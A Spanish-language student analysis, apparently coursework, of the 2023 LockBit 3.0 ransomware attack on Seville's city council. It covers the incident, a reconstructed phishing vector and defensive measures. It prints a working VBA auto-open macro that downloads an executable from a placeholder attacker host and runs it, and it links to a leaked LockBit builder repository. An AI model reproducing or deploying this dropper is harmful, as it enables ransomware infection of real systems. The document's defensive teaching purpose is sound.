 # 🛡️ Análisis Forense: LockBit 3.0 y el Caso Ayuntamiento de Sevilla

**Autor:** Luis María Chaves López
**Asignatura:** Ciberdelitos y Regulación de la Ciberseguridad
**Tema:** Análisis de Vectores de Ataque (Ransomware)

---

## 1. 🚨 La Escena del Crimen: El Caso Sevilla (2023)

El **5 de septiembre de 2023**, el Ayuntamiento de Sevilla sufrió un ciberataque crítico que paralizó los servicios digitales de la ciudad, obligando a los funcionarios a operar manualmente y desconectando la red interna durante semanas.

### Datos Clave del Incidente
* **Autoría:** El grupo **LockBit** reivindicó el ataque utilizando su variante **LockBit 3.0 (Black)**.
* **Impacto:** Se estima el compromiso de **4.000 ordenadores y 800 servidores**. Se ejecutó un "Kill Switch" defensivo cortando la Intranet.
* **Extorsión:** Se exigió un rescate inicial de **1.5 millones de euros** (elevado posteriormente a 5M€) bajo la amenaza de publicar datos sensibles (Doble Extorsión).

* [Ciberataque al Ayto. de Sevilla (Málaga 24h)](https://www.youtube.com/watch?v=PcfV74RGUts): Este informativo resume las primeras horas del ataque, el impacto directo en el ciudadano y la firme postura del ayuntamiento de no ceder al chantaje económico.
* [Análisis del Secuestro Informático](https://www.youtube.com/watch?v=X0E3zQ5ThmU): Entrevista técnica que detalla el impacto en la disponibilidad de los servicios críticos, mediante la **caída del Directorio Active** (AD), ya que Lockbit compromete el AD para desplegarse, al "matar" o cifrar los controladores de dominio, **ningún funcionario puede iniciar sesión**, y **cifrando la Bases de Datos SQL**, los programas que usan la policía (multas), el padrón o Hacienda no funcionan porque sus bases de datos subyacentes (.mdf, .ldf, .ora) han sido convertidas en archivos cifrados inútiles por el malware. La complejidad del Plan de Recuperación ante Desastres (DRP), incluyendo la sanitización de activos y la restauración desde copias offline.

> **Fuentes del caso:**
> * 📰 [LockBit: el grupo detrás del ciberataque al Ayuntamiento de Sevilla (Cuadernos de Seguridad)](https://cuadernosdeseguridad.com/2023/09/lockbit-ayuntamiento-sevilla/)
> * 📺 [Hackean la web del Ayuntamiento de Sevilla y piden rescate millonario (La Sexta)](https://www.lasexta.com/noticias/nacional/hackean-web-ayuntamiento-sevilla-piden-rescate-millonario-consistorio_2023090664f8579f714dff0001d87ccd.html)

---

## 2. 🔬 Anatomía Técnica: Vector de Ataque

Dado que no existe un informe forense público, esta investigación reconstruye el vector de ataque más probable basándose en el análisis del **'builder' de LockBit 3.0 filtrado en GitHub**.

### Hipótesis de Entrada: Phishing + Macros VBA
Aunque LockBit explota RDP, el vector de entrada predominante en administración pública es el **Phishing**. Analizando el código fuente, hemos aislado la macro maliciosa que actúa como *dropper*.

#### Código del Vector de Infección (VBA)
Este script se oculta en documentos Word adjuntos (facturas/citaciones). Al habilitar la edición, se ejecuta:

```vba
Sub Document_Open()
    ' Creación de objetos para conexión HTTP
    dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
    dim bStrm: Set bStrm = createobject("Adodb.Stream")
    
    ' 1. Descarga del Payload (LB3.exe) desde el C2 del atacante
    xHttp.Open "GET", "[http://servidor-atacante.com/LB3.exe](http://servidor-atacante.com/LB3.exe)", False
    xHttp.Send

    ' 2. Evasión y Persistencia en disco
    with bStrm
        .type = 1 '//binary
        .open
        .write xHttp.responseBody
        ' Guarda en C:\Temp para evitar pedir permisos de Admin inmediatos
        .savetofile "c:\temp\LB3.exe", 2 
    end with

    ' 3. Ejecución del Ransomware
    CreateObject("WScript.Shell").Run "c:\temp\LB3.exe"
End Sub
```

#### Fase de Ejecución e Impacto
Una vez el LB3.exe se ejecuta en la máquina de la víctima (Paciente Cero):
1. **Escalada de Privilegios**: El malware intenta obtener permisos de SYSTEM.

2. **Movimiento Lateral**: Utiliza herramientas como PsExec para propagarse por la red (explicando la infección de 800 servidores en Sevilla).

3. **Impacto Irreversible**: Elimina las Shadow Copies (copias de seguridad de volumen) para impedir la restauración simple.

[Fuente del repositorio filtardo](https://github.com/Tennessene/LockBit)


##### Demo Técnica y Análisis de Código
* **[Dissecting LockBit 3.0 Builder (Josh Stroschein)](https://www.youtube.com/watch?v=sEibWbJIMss)**: **Análisis de la arquitectura del Builder.** El vídeo demuestra el ciclo completo de generación del malware: desde la **parametrización del ataque** (procesamiento de argumentos y archivos de configuración JSON) hasta la **compilación del payload**, mostrando cómo la herramienta inyecta las claves criptográficas públicas en el ejecutable final para personalizar la campaña.
  * 📄 **[Documentación Técnica Completa (GitHub)](https://github.com/arosenmund/defcon32_dissecting_defeating_ransomwares_evasion/blob/main/part1-builder_review.md)**: Guía paso a paso del taller de ingeniería inversa, detallando las instrucciones de depuración y análisis estático mencionadas en el vídeo.

## 3. 🛡️ Mitigación y Defensa (Blue Team)

Para evitar la propagación masiva vista en el caso de Sevilla, se proponen las siguientes medidas basadas en las recomendaciones de INCIBE y CISA:
#### Prevención (Kill Chain temprana)
* **Deshabilitar Macros por GPO**: Configurar directivas de grupo para que los documentos de Office descargados de Internet no puedan ejecutar macros VBA. Esto neutraliza el código expuesto arriba.
* **Autenticación Multifactor**: Obligatorio para todos los accesos remotos (VPN/RDP).

#### Contención (Durante el ataque)
* **Segmentación de Red**: Aislar las redes de usuarios (funcionarios) de los servidores críticos. Esto habría evitado que el ataque saltara a los 800 servidores.
* **Backup Offline (3-2-1)**: LockBit borra los backups conectados. Es vital mantener copias "inmutables" o en cinta desconectada.

> **Referencias Oficiales:**
> * [Incibe](https://www.incibe.es/incibe-cert/blog/lockbit-acciones-de-respuesta-y-recuperacion)
> * [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)
